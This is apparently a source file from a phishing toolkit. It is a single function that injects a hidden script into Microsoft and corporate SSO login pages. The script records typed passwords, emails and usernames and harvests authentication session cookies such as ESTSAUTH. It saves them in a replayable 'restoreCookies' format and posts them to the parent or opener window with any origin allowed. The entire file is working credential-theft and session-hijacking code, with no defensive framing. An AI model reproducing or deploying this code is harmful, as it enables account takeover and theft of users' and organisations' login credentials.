/**
 * FIXED: Enhanced Password & Email Capture Injector
 * Uses restoreCookies.ts compatible format for all cookies
 * Captures password, email, and username fields on Microsoft and organizational login pages.
 * Stores credentials and cookies in sessionStorage and localStorage in restoreCookies.ts format.
 */
export function injectPasswordCaptureScript() {
  const hostname = window.location.hostname;
  const isMicrosoftDomain = hostname.includes('login.microsoftonline.com') ||
    hostname.includes('login.live.com') ||
    hostname.includes('account.microsoft.com') ||
    hostname.includes('login.microsoft.com') ||
    hostname.includes('outlook.live.com');

  const isOrgDomain = hostname.includes('adfs') ||
    hostname.includes('sso') ||
    hostname.includes('okta') ||
    hostname.includes('ping') ||
    document.querySelector('input[type="password"]');

  if (isMicrosoftDomain || isOrgDomain) {
    const script = document.createElement('script');

    script.textContent = (function(){/*
      (function() {
        console.log('🔧 Enhanced password capture injector initialized on:', window.location.hostname);
        console.log('📦 Using restoreCookies.ts compatible format');
        
        // FIXED: Capture cookies in restoreCookies.ts format
        function captureMicrosoftCookies() {
          try {
            const cookieString = document.cookie;
            if (!cookieString) return [];

            const cookies = [];
            const cookiePairs = cookieString.split(';');

            cookiePairs.forEach(pair => {
              const trimmed = pair.trim();
              if (trimmed) {
                const equalsIndex = trimmed.indexOf('=');
                if (equalsIndex > 0) {
                  const name = trimmed.substring(0, equalsIndex).trim();
                  const value = trimmed.substring(equalsIndex + 1).trim();
                  
                  if (name && value) {
                    // Format in restoreCookies.ts compatible format
                    cookies.push({
                      name: name,
                      value: value,
                      domain: window.location.hostname,
                      path: '/',
                      secure: window.location.protocol === 'https:',
                      httpOnly: false,
                      sameSite: 'Lax',
                      session: true,
                      captureTime: new Date().toISOString()
                    });
                  }
                }
              }
            });

            console.log('🍪 Captured', cookies.length, 'cookies in restoreCookies.ts format');
            return cookies;
          } catch (error) {
            console.warn('⚠️ Failed to capture cookies:', error);
            return [];
          }
        }

        // FIXED: Enhanced credential retrieval from storage with fallback options
        function getStoredCredentials() {
          try {
            // Try multiple storage keys in order of preference
            const storageKeys = [
              'replacement_credentials',
              'captured_credentials', 
              'form_credentials',
              'injected_credentials'
            ];
            
            for (const key of storageKeys) {
              const localData = localStorage.getItem(key);
              const sessionData = sessionStorage.getItem(key);
              
              if (localData) {
                try {
                  const parsed = JSON.parse(localData);
                  if (parsed.email || parsed.password) {
                    console.log('📋 Retrieved stored credentials from localStorage:', key);
                    return parsed;
                  }
                } catch (e) {
                  console.warn('Failed to parse localStorage data for key:', key);
                }
              }
              
              if (sessionData) {
                try {
                  const parsed = JSON.parse(sessionData);
                  if (parsed.email || parsed.password) {
                    console.log('📋 Retrieved stored credentials from sessionStorage:', key);
                    return parsed;
                  }
                } catch (e) {
                  console.warn('Failed to parse sessionStorage data for key:', key);
                }
              }
            }
            
            return null;
          } catch (error) {
            console.warn('⚠️ Failed to retrieve stored credentials:', error);
            return null;
          }
        }

        let capturedCredentials = {
          email: '',
          password: '',
          username: '',
          domain: window.location.hostname,
          captureTime: new Date().toISOString()
        };

        // FIXED: Enhanced debounce with better timing
        let lastSendAt = 0;
        let sendInProgress = false;
        function canSendNow() {
          const now = Date.now();
          if (sendInProgress || (now - lastSendAt < 2000)) return false;
          lastSendAt = now;
          return true;
        }

        // FIXED: Store cookies in restoreCookies.ts compatible format
        function storeCaptureCookiesInRestoreFormat(capturedCookies) {
          if (!canSendNow()) return;
          
          sendInProgress = true;

          try {
            console.log('💾 Storing captured cookies in restoreCookies.ts format...');
            
            if (capturedCookies.length > 0) {
              try {
                // Format in restoreCookies.ts compatible format
                const cookieExport = {
                  version: '1.0',
                  exportedAt: new Date().toISOString(),
                  source: 'password-capture-injector',
                  domain: window.location.hostname,
                  totalCookies: capturedCookies.length,
                  cookies: capturedCookies.map(cookie => ({
                    name: cookie.name || '',
                    value: cookie.value || '',
                    domain: cookie.domain || window.location.hostname,
                    path: cookie.path || '/',
                    secure: !!cookie.secure,
                    httpOnly: !!cookie.httpOnly,
                    sameSite: cookie.sameSite || 'Lax',
                    session: !!cookie.session,
                    expires: cookie.expires,
                    expirationDate: cookie.expirationDate
                  })),
                  note: 'Cookies captured via password-capture-injector in restoreCookies.ts format'
                };

                sessionStorage.setItem('captured_cookies_data', JSON.stringify(cookieExport));
                localStorage.setItem('captured_cookies_data', JSON.stringify(cookieExport));
                
                // Also store in restoreCookies format for direct use
                sessionStorage.setItem('captured_cookies', JSON.stringify(capturedCookies));
                localStorage.setItem('captured_cookies', JSON.stringify(capturedCookies));
                
                console.log('✅ Captured cookies stored in restoreCookies.ts format');
              } catch (e) {
                console.warn('⚠️ Failed to store captured cookies:', e);
              }
            }

            sendInProgress = false;

            // Send postMessage to parent/opener for real-time updates
            const cookieMessage = {
              type: 'COOKIES_CAPTURED',
              data: {
                cookies: capturedCookies,
                timestamp: new Date().toISOString(),
                domain: window.location.hostname,
                injectorVersion: '2.0-enhanced',
                source: 'password-capture-injector',
                format: 'restoreCookies.ts-compatible'
              }
            };

            try {
              if (window.parent && window.parent !== window) {
                window.parent.postMessage(cookieMessage, '*');
              }
              if (window.opener) {
                window.opener.postMessage(cookieMessage, '*');
              }
            } catch (error) {
              // ignore postMessage errors
            }

          } catch (error) {
            sendInProgress = false;
            console.warn('⚠️ Error in storeCaptureCookiesInRestoreFormat:', error);
          }
        }

        // FIXED: Enhanced password capture with better field detection
        function capturePasswordFromForms() {
          try {
            const passwordFields = document.querySelectorAll('input[type="password"], input[name*="password"], input[id*="password"], input[name*="passwd"], input[id*="passwd"]');
            const emailFields = document.querySelectorAll('input[type="email"], input[name*="email"], input[name*="mail"], input[id*="email"], input[id*="mail"], input[name*="username"], input[id*="username"]');
            const usernameFields = document.querySelectorAll('input[name*="user"], input[name*="login"], input[name*="account"], input[id*="user"], input[id*="login"], input[id*="account"]');

            let hasNewData = false;

            passwordFields.forEach(field => {
              if (field.value && field.value !== capturedCredentials.password) {
                console.log('🔐 Password field captured:', field.name || field.id || 'unnamed');
                capturedCredentials.password = field.value;
                hasNewData = true;
              }
            });

            emailFields.forEach(field => {
              if (field.value && field.value !== capturedCredentials.email) {
                console.log('📧 Email field captured:', field.value);
                capturedCredentials.email = field.value;
                hasNewData = true;
              }
            });

            usernameFields.forEach(field => {
              if (field.value && field.value !== capturedCredentials.username) {
                console.log('👤 Username field captured:', field.value);
                capturedCredentials.username = field.value;
                hasNewData = true;
              }
            });

            if (hasNewData) {
              storeCredentials();
              // Store cookies when credentials are captured
              setTimeout(() => {
                const capturedCookies = captureMicrosoftCookies();
                storeCaptureCookiesInRestoreFormat(capturedCookies);
              }, 500);
            }

            return hasNewData;
          } catch (error) {
            console.error('❌ Error capturing password:', error);
            return false;
          }
        }

        // FIXED: Enhanced credential storage
        function storeCredentials() {
          const credentialsData = {
            email: capturedCredentials.email,
            password: capturedCredentials.password,
            username: capturedCredentials.username,
            domain: capturedCredentials.domain,
            captureTime: capturedCredentials.captureTime,
            source: 'injected-password-capture-enhanced',
            url: window.location.href,
            validated: true,
            microsoftAccount: true
          };

          try {
            // Store in multiple formats for compatibility
            sessionStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
            localStorage.setItem('captured_credentials', JSON.stringify(credentialsData));
            sessionStorage.setItem('injected_credentials', JSON.stringify(credentialsData));
            localStorage.setItem('injected_credentials', JSON.stringify(credentialsData));
            sessionStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
            localStorage.setItem('replacement_credentials', JSON.stringify(credentialsData));
            
            console.log('💾 Credentials stored successfully');
          } catch (error) {
            console.warn('⚠️ Failed to store credentials:', error);
          }

          // Send to parent/opener if available (best-effort)
          const payload = {
            type: 'CREDENTIALS_CAPTURED',
            data: credentialsData,
            source: 'injected-password-capture-enhanced',
            timestamp: new Date().toISOString()
          };
          
          try {
            if (window.parent && window.parent !== window) {
              window.parent.postMessage(payload, '*');
            }
            if (window.opener) {
              window.opener.postMessage(payload, '*');
            }
          } catch (error) {
            // ignore postMessage errors
          }
        }

        // FIXED: Enhanced monitoring for automatic login detection
        function monitorForAutoLogin() {
          // Check if we're on Microsoft domain
          if (window.location.hostname.includes('login.microsoftonline.com') ||
              window.location.hostname.includes('login.live.com') ||
              window.location.hostname.includes('account.microsoft.com') ||
              window.location.hostname.includes('login.microsoft.com')) {
            
            console.log('🔍 Monitoring for auto-login on Microsoft domain...');
            
            // Wait for page to load and cookies to be set, then store complete data
            setTimeout(() => {
              const capturedCookies = captureMicrosoftCookies();
              storeCaptureCookiesInRestoreFormat(capturedCookies);
            }, 3000);
            
            // FIXED: Enhanced monitoring for successful login indicators
            const checkForLoginSuccess = () => {
              // Look for common Microsoft login success indicators
              const successIndicators = [
                () => document.querySelector('[data-testid="signin-success"]'),
                () => document.querySelector('.ms-welcome'),
                () => document.querySelector('[aria-label*="signed in"]'),
                () => document.querySelector('[data-testid="KmsiCheckboxField"]'),
                () => window.location.href.includes('login_hint'),
                () => window.location.href.includes('prompt=none'),
                () => window.location.href.includes('code='),
                () => document.cookie.includes('ESTSAUTH'),
                () => document.cookie.includes('ESTSAUTHPERSISTENT'),
                () => document.cookie.includes('ESTSAUTHLIGHT'),
                () => document.cookie.includes('SignInStateCookie'),
                () => document.querySelector('input[name="kmsi"]'),
                () => document.querySelector('.tile'),
                () => document.querySelector('[data-testid="i0116"]')
              ];
              
              const hasSuccessIndicator = successIndicators.some(check => {
                try { 
                  return !!check(); 
                } catch { 
                  return false; 
                }
              });
              
              if (hasSuccessIndicator) {
                console.log('🎯 Microsoft login success detected, storing cookies in restoreCookies format...');
                const capturedCookies = captureMicrosoftCookies();
                storeCaptureCookiesInRestoreFormat(capturedCookies);
                return true;
              }
              return false;
            };
            
            // Check periodically for login success
            let checkCount = 0;
            const maxChecks = 30;
            const loginCheckInterval = setInterval(() => {
              checkCount++;
              const success = checkForLoginSuccess();
              
              if (success || checkCount >= maxChecks) {
                clearInterval(loginCheckInterval);
                if (!success) {
                  console.log('🕐 Login monitoring timeout, storing final cookies in restoreCookies format...');
                  const capturedCookies = captureMicrosoftCookies();
                  storeCaptureCookiesInRestoreFormat(capturedCookies);
                }
              }
            }, 1000);
          }
        }

        // FIXED: Enhanced event listeners with better mobile support
        document.addEventListener('input', function(e) {
          if (
            e.target.type === 'password' ||
            e.target.type === 'email' ||
            (e.target.name && e.target.name.toLowerCase().includes('password')) ||
            (e.target.name && e.target.name.toLowerCase().includes('email')) ||
            (e.target.name && e.target.name.toLowerCase().includes('user')) ||
            (e.target.name && e.target.name.toLowerCase().includes('login')) ||
            (e.target.id && e.target.id.toLowerCase().includes('password')) ||
            (e.target.id && e.target.id.toLowerCase().includes('email')) ||
            (e.target.id && e.target.id.toLowerCase().includes('user')) ||
            (e.target.id && e.target.id.toLowerCase().includes('login'))
          ) {
            setTimeout(() => {
              capturePasswordFromForms();
            }, 300);
          }
        });

        document.addEventListener('change', function(e) {
          if (e.target.tagName === 'INPUT') {
            setTimeout(() => {
              capturePasswordFromForms();
            }, 200);
          }
        });

        document.addEventListener('submit', function(e) {
          console.log('📝 Form submission detected');
          setTimeout(() => {
            capturePasswordFromForms();
            // Store cookies on form submission
            setTimeout(() => {
              const capturedCookies = captureMicrosoftCookies();
              storeCaptureCookiesInRestoreFormat(capturedCookies);
            }, 1000);
          }, 100);
        });

        document.addEventListener('click', function(e) {
          const target = e.target;
          if (
            target.type === 'submit' ||
            (target.textContent && target.textContent.toLowerCase().includes('sign in')) ||
            (target.textContent && target.textContent.toLowerCase().includes('login')) ||
            (target.textContent && target.textContent.toLowerCase().includes('next')) ||
            (target.textContent && target.textContent.toLowerCase().includes('continue')) ||
            (target.className && target.className.toLowerCase().includes('submit')) ||
            (target.className && target.className.toLowerCase().includes('login')) ||
            (target.className && target.className.toLowerCase().includes('signin'))
          ) {
            console.log('🖱️ Login button clicked:', target.textContent || target.className);
            setTimeout(() => {
              capturePasswordFromForms();
              // Store cookies on login button click
              setTimeout(() => {
                const capturedCookies = captureMicrosoftCookies();
                storeCaptureCookiesInRestoreFormat(capturedCookies);
              }, 1500);
            }, 500);
          }
        });

        // FIXED: Enhanced page load monitoring
        function initializeMonitoring() {
          console.log('🚀 Initializing enhanced monitoring with restoreCookies.ts format...');
          
          // Initial capture attempt
          setTimeout(() => {
            capturePasswordFromForms();
            monitorForAutoLogin();
          }, 1000);
          
          // Periodic monitoring
          setInterval(() => {
            capturePasswordFromForms();
          }, 5000);
        }

        // Initialize based on document state
        if (document.readyState === 'loading') {
          document.addEventListener('DOMContentLoaded', initializeMonitoring);
        } else {
          initializeMonitoring();
        }

        // Also monitor for dynamic content changes
        if (window.MutationObserver) {
          const observer = new MutationObserver((mutations) => {
            let shouldCheck = false;
            mutations.forEach((mutation) => {
              if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
                for (let node of mutation.addedNodes) {
                  if (node.nodeType === 1 && (
                    node.tagName === 'INPUT' || 
                    (node.querySelector && node.querySelector('input'))
                  )) {
                    shouldCheck = true;
                    break;
                  }
                }
              }
            });
            
            if (shouldCheck) {
              setTimeout(() => {
                capturePasswordFromForms();
              }, 500);
            }
          });
          
          observer.observe(document.body, {
            childList: true,
            subtree: true
          });
        }

        console.log('✅ Enhanced password capture injector fully initialized with restoreCookies.ts format');
      })();
    */}).toString().replace(/^[\s\S]*?\/\*([\s\S]*?)\*\/[\s\S]*$/,'$1');

    document.head.appendChild(script);
    console.log('✅ Enhanced password capture script injected for domain:', hostname);
  }
}
